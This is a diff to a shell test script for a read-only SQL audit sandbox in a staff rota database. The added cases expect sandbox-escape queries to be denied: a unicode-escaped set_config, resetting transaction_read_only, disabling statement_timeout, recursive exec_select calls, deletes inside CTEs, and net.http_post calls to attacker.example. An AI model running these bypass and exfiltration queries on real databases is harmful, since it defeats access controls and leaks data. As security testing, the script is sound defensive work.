@@ -52,6 +52,42 @@ ro "audit-sql: push endpoints table" $A 1 "select * from push_subscriptions" den
 ro "audit-sql: multiple statements" $A 1 "select 1; select 2" denied
 ro "audit-sql: data-modifying CTE" $A 1 "with d as (delete from leave_requests returning id) select * from d" denied
 
+ro "audit-sql: icu_detection_matches.source_row (raw payload)" $A 1 "select source_row from icu_detection_matches" denied
+ro "audit-sql: icu_detection_matches.matched_value (raw upstream text)" $A 1 "select matched_value from icu_detection_matches" denied
+ro "audit-sql: icu_detection_matches allowlisted columns" $A 1 "select staff_id, session_date, matched_field from icu_detection_matches" allowed
+ro "audit-sql: clwrota_sync_state.rota_report_url (secret URL)" $A 1 "select rota_report_url from clwrota_sync_state" denied
+ro "audit-sql: clwrota_sync_state.last_error" $A 1 "select last_error from clwrota_sync_state" denied
+ro "audit-sql: clwrota_sync_state allowlisted status" $A 1 "select last_status, last_sync_at from clwrota_sync_state" allowed
+ro "audit-sql: rpc_access_alerts.details (not allowlisted table)" $A 1 "select details from rpc_access_alerts" denied
+ro "audit-sql: pulse_survey_responses (individual wellbeing)" $A 1 "select score_1 from pulse_survey_responses" denied
+ro "audit-sql: select * on table with hidden columns" $A 1 "select * from clwrota_sync_state" denied
+ro "audit-sql: unicode-escaped set_config" $A 1 "select U&\"set\\005fconfig\"('transaction_read_only','off',true)" denied
+ro "audit-sql: recursive exec_select via wrapper" $A 1 "select audit_ro.exec_select('select 1')" denied
+
+# 4b. Boundary WITHOUT the wrapper's text screen: call audit_ro.exec_select
+# directly (as the wrapper does) inside a forced read-only transaction with the
+# live authenticated statement_timeout, then try to escape it.
+raw() { # name query expect
+  local out; out=$($P -At 2>&1 <<SQL || true
+BEGIN;
+SET LOCAL statement_timeout = '1500';
+SELECT set_config('transaction_read_only','on',true);
+SELECT audit_ro.exec_select(\$q\$$2\$q\$)::text;
+ROLLBACK;
+SQL
+)
+  local actual=allowed; echo "$out" | grep -q "ERROR" && actual=denied
+  $P -c "INSERT INTO results VALUES (\$a\$$1\$a\$, '$3', '$actual', \$b\$$(echo "$out" | grep ERROR | head -1)\$b\$)"
+}
+raw "boundary: reset transaction_read_only off then side effect" "select net.http_post('https://attacker.example') from (select set_config('transaction_read_only','off',true)) s" denied
+raw "boundary: reset transaction_read_only off alone" "select set_config('transaction_read_only','off',true)" denied
+raw "boundary: disable statement_timeout then sleep 4s" "select pg_sleep(4) from (select set_config('statement_timeout','0',true)) s" denied
+raw "boundary: recursive exec_select then side effect" "select audit_ro.exec_select('select net.http_post(''https://attacker.example'')')" denied
+raw "boundary: recursive exec_select reads hidden column" "select audit_ro.exec_select('select source_row from icu_detection_matches')" denied
+raw "boundary: write via data-modifying CTE" "with d as (delete from rota_assignments returning id) select * from d" denied
+raw "boundary: allowlisted read still works" "select count(*) from rota_assignments" allowed
+$P -c "INSERT INTO results SELECT 'boundary: no side effect reached net queue', 'allowed', CASE WHEN (SELECT count(*) FROM net.http_request_queue)=0 THEN 'allowed' ELSE 'denied' END, NULL"
+
 $P -P pager=off -c "SELECT CASE WHEN expected=actual THEN 'PASS' ELSE 'FAIL' END AS result, name, expected, actual, left(coalesce(detail,''),90) AS detail FROM results ORDER BY 1, 2"
 FAILS=$($P -At -c "SELECT count(*) FROM results WHERE expected<>actual")
 TOTAL=$($P -At -c "SELECT count(*) FROM results")
